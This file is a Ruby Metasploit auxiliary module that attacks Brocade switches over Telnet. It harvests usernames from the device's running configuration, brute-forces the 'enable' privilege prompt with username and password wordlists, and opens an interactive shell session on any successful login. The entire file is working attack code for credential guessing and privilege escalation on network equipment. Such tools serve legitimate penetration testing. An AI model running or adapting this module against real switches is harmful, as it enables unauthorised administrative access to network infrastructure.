##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
#require 'metasploit/framework/credential_collection'
#require 'metasploit/framework/login_scanner/telnet'

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::Remote::Telnet
  include Msf::Auxiliary::Report
  #include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::CommandShell

  def initialize
    super(
      'Name'        => 'Brocde Enable Login Check Scanner',
      'Description' => %q{
        This module will test a Brocade Enable login on a range of machines and
        report successful logins.  If you have loaded a database plugin
        and connected to a database this module will record successful
        logins and hosts so you can track your access.
        Tested against:
              ICX6450-24 SWver 07.4.00bT311
      },
      'Author'      => 'h00die <mike[at]shorebreaksecurity.com>',
      'References'  =>
        [
          [ 'CVE', '1999-0502'] # Weak password
        ],
      'License'     => MSF_LICENSE
    )
    register_options(
      [
        OptPath.new('UN_FILE',[false,'Username File']),
        OptPath.new('PASS_FILE',[true,'Password File']),
        OptString.new('TELNET_PASS',[false,'Telnet Password'])
      ], self.class
    )
    register_advanced_options(
      [
        OptInt.new('TIMEOUT', [ true, 'Default timeout for telnet connections.', 25])
      ], self.class
    )
    deregister_options('USERNAME', 'PASSWORD')

    #@no_pass_prompt = []
  end

  def get_username_from_config(un_list,ip)
    ["config","running-config"].each do |command|
	    print_status(" Attempting username gathering from #{command} on #{ip}")
	    sock.puts("\r\n") #ensure the buffer is clear
	    config = sock.recv(1024)
	    sock.puts("show #{command}\r\n")
            while true do
		sock.puts(" \r\n") #paging
		config << sock.recv(1024)
                #there seems to be some buffering issues. so we want to match that we're back at a prompt, as well as received the 'end' of the config.
                break if (config.match(/>$/) or config.match(/> $/)) and config.match(/end/) 
	    end
	    #print_status(config)
	    config.each_line do |un|
	      if un.match(/^username/)
		found_username = un.split(" ")[1].strip
		un_list.add(found_username)
		print_status("   Found: #{found_username}@#{ip}")
	      end
	      #print_error(command + un)
	    end
	  end
  end

  def run_host(ip)
    pass_list = {}.to_set
    #get the password list
    if datastore['PASS_FILE']
      if not ::File.exists?(datastore['PASS_FILE'])
        print_error("Wordlist File #{datastore['PASS_FILE']} does not exists!")
      else
        ::File.open(datastore['PASS_FILE'], "rb").each do |pass|
          pass_list.add(pass.strip)
        end
      end
    end

    #get the username list
    un_list = {}.to_set
    if datastore['UN_FILE']
      if not ::File.exists?(datastore['UN_FILE'])
        print_error("Username File #{datastore['UN_FILE']} does not exists!")
      else
        ::File.open(datastore['UN_FILE'], "rb").each do |un|
          un_list.add(un.strip)
        end
      end
    end
    #print_status("Attempting connection")
    connect()
    print_status("Connected to #{ip}")
    #get passed the banner if there is one
    while true do
      #print_status("true loop to get passed banner")
      sock.puts("\r\n")
      data = sock.recv(1024)
      break if data.match(/>$/)
    end
    term_prompt = data
    #try to get the usernames from the config
    get_username_from_config(un_list,ip)
    #print_status("starting login loop")
    #un_list.each do |u|
    #  print_status("#{u}")
    #end
    un_list.each do |username|
      next if username.match(/^logout/)
      pass_list.each do |password|
        password = password.strip
        next if password.match(/^logout/)
        sock.puts("enable\r\n")
        print_status("\tTrying #{username}@#{ip}:#{password}")
        while true do
            data << sock.recv(1024) 
            break if data.match(/User Name:$/)
        end #true
        data = ""
        sock.puts(username + "\r\n")
        while true do
            data << sock.recv(1024) 
            break if data.match(/Password:$/)
        end #true
        data = ""
        sock.puts(password + "\r\n")
        while true do
            data << sock.recv(1024) 
            break if data.match(/^Error/) or data.match(/\#$/)
        end #true
        if data.match(/\#$/)
           print_good("\tSUCCESS! #{username}@#{ip}:#{password}")
           start_telnet_session(ip,datastore["RPORT"],username,password,sock)
           break
           #sock.puts("exit\r\n") #drop back down to continue testing
        end #win or not
      end #passwoard list
    end #username list
    disconnect()
  end #run_host

  def start_telnet_session(host, port, user, pass, sock)
    print_status "Attempting to start session #{host}:#{port} with #{user}:#{pass}"
    merge_me = {
      'USERPASS_FILE' => nil,
      'USER_FILE'     => nil,
      'PASS_FILE'     => nil,
      'USERNAME'      => user,
      'PASSWORD'      => pass
    }

    start_session(self, "TELNET #{host}:#{port} (ENABLE #{user}:#{pass})", merge_me, true, sock)
  end

end
